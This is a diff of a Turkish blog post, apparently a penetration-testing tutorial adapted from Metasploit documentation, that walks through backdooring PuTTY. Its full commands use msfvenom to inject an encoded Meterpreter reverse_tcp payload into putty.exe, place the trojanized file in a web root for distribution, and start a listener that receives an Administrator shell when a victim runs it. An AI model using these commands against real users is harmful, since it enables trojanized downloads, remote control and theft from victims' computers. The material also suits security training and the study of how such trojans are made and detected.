@@ -5,7 +5,7 @@ date: 2017-06-16 09:01:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,17 +13,26 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework timestomp
-- msf meterpreter timestomp
+- Metasploit Framework backdoor
+- msf meterpreter exe backdoor
 
-excerpt: Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek **forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter ```timestomp``` adı verilen bir komut sağlamaktadır.
+excerpt: Bir hedef bilgisayara yönelik olarak özel bir .exe dosyası oluşturmak ve içine kodlar gömmek gerçekten uzun zaman alabilir. Bunun yerine, zaten var olan bir .exe uzantılı dosyanın içine, Metasploit Payload modülleri yerleştirebilirsiniz.
 ---
 
-Backdooring EXE Files
-Creating customized backdoored executables often took a long period of time to do manually as attackers. The ability to embed a Metasploit Payload in any executable that you want is simply brilliant. When we say any executable, it means any executable. You want to backdoor something you download from the internet? How about iexplorer? Or explorer.exe or putty, any of these would work. The best part about it is its extremely simple. We begin by first downloading our legitimate executable, in this case, the popular PuTTY client.
+# Bir EXE Dosyası İle Arka Kapı Oluşturma
 
+Bir hedef bilgisayara yönelik olarak özel bir .exe dosyası oluşturmak ve içine kodlar gömmek gerçekten uzun zaman alabilir. Bunun yerine, zaten var olan bir .exe uzantılı dosyanın içine, Metasploit Payload modülleri yerleştirebilirsiniz.
+
+Bu yazıda, bir .exe dosyasının içine, Metasploit Payload yerleştirip encode etmeyi göreceğiz. Bu sayede, kodlanmış özel .exe dosyasını çalıştıran kullanıcının bilgisayarından bizim bilgisayarımıza Meterpreter oturum açılacaktır.
+
+## Exe Dosyası İndirme
+
+Örneğimizde, ```putty.exe``` isimli dosyayı kullanacağız. Öncelikle bu dosyayı indirelim. Encode edilmiş .exe dosyamızı web sayfasından dağıtacağımıza göre, Kali Linux içinde sunucumuzun bulunduğu ```/var/www/``` klasörüne gidelim ve indirmeyi aşağıdaki komut ile başlatalım.
+
+```sh
 root@kali:/var/www# wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
 --2015-07-21 12:01:27--  http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+
 Resolving the.earth.li (the.earth.li)... 46.43.34.31, 2001:41c8:10:b1f:c0ff:ee:15:900d
 Connecting to the.earth.li (the.earth.li)|46.43.34.31|:80... connected.
 HTTP request sent, awaiting response... 302 Found
@@ -39,9 +48,14 @@ Saving to: `putty.exe'
 2015-07-21 12:01:28 (815 KB/s) - `putty.exe' saved [524288/524288]
 
 root@kali:/var/www#
+```
+
+Şimdi, bu indirdiğimiz ```putty.exe``` dosyasının içine, ```msfvenom``` komutunu kullanarak bir Metasploit Payload modülünü yerleştireceğiz. Yerleştireceğimiz modül, ```windows/meterpreter/reverse_tcp``` modülüdür ve LHOST olarak kendi IP adresimiz olan 192.168.1.101 IP adresini ayarlayacağız.
+
 Next, we use msfvenom to inject a meterpreter reverse payload into our executable and encoded it 3 times using shikata_ga_nai and save the backdoored file into our web root directory.
 
 root@kali:/var/www# msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
+
 Found 1 compatible encoders
 Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 326 (iteration=0)
@@ -51,24 +65,41 @@ x86/shikata_ga_nai chosen with final size 380
 Payload size: 380 bytes
 Saved as: puttyX.exe
 root@kali:/var/www#
-Since we have selected a reverse meterpreter payload, we need to setup the exploit handler to handle the connection back to our attacking machine.
+```
 
+İşlem başarıyla sonuçlandığında elimizde ```puttyX.exe``` isimli kodlanmış ve içine payload yerleştirilmiş bir çalıştırılabilir dosya bulunmaktadır.
+
+.exe dosyasının içine, reverse payload yerleştirildiğine göre, bu payload bizim yerel bilgisayarımıza bağlanmak isteyecektir. O zaman, ```msfconsole``` içerisinde bir dinleyici modül çalıştırmalıyız ki bağlantı mümkün olsun.
+
+Bunun için ```exploit/multi/handler``` modülünü kullanalım ve gerekli ayarları yapalım.
+
+```sh
 msf > use exploit/multi/handler 
+
 msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp 
 PAYLOAD => windows/meterpreter/reverse_tcp
+
 msf exploit(handler) > set LHOST 192.168.1.101
 LHOST => 192.168.1.101
+
 msf exploit(handler) > set LPORT 443
 LPORT => 443
+
 msf exploit(handler) > exploit
 
 [*] Started reverse handler on 192.168.1.101:443 
 [*] Starting the payload handler...
-As soon as our victim downloads and executes our special version of PuTTY, we are presented with a meterpreter shell on the target.
+```
 
+Artık dinleme modülü de çalışmaktadır. Bu aşamadan sonra yapılması gereken, oluşturduğumuz .exe dosyasını web üzerinden dağıtmaktır. Herhangi bir kullanıcı bu dosyayı çalıştırdığında, otomatik olarak yerel bilgisayarımıza bağlanacak ve Meterpreter oturumu açılacaktır.
+
+```sh
 [*] Sending stage (749056 bytes) to 192.168.1.201
 [*] Meterpreter session 1 opened (192.168.1.101:443 -> 192.168.1.201:1189) at Sat Feb 05 08:54:25 -0700 2011
 
 meterpreter > getuid
 Server username: XEN-XP-SPLOIT\Administrator
 meterpreter >
+```
+
+Bu yazıda anlatılan işlemler ve .exe dosyasının dağıtılması, göründüğünden daha uzun süre alabilir. Burada sadece işlemin mantığı açıklanmaya çalışılmıştır.
